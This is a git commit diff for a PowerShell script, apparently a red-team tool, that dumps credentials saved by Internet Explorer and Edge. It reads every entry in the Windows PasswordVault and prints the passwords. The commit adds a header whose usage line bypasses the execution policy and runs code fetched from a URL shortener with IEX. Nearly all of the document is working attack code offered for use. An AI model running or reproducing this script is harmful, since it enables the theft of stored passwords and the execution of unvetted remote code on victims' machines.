25e1b28d0b7b5b2c08131196c4986a95ebc84498
Florian Hansemann <info@hansesecure.de>
2019-04-25 12:10:04 +0200

    Update credgrap_ie_edge.ps1

--- credgrap_ie_edge.ps1
+++ credgrap_ie_edge.ps1
@@ -1,3 +1,8 @@
+# Content: Extract stored credentials from Internet Explorer and Edge
+# Author: Florian Hansemann | @HanseSecure | https://hansesecure.de
+# Date: 04/2018
+# Usage: powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/2K75g15’)"
+
 [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
 $vault = New-Object Windows.Security.Credentials.PasswordVault
 $vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
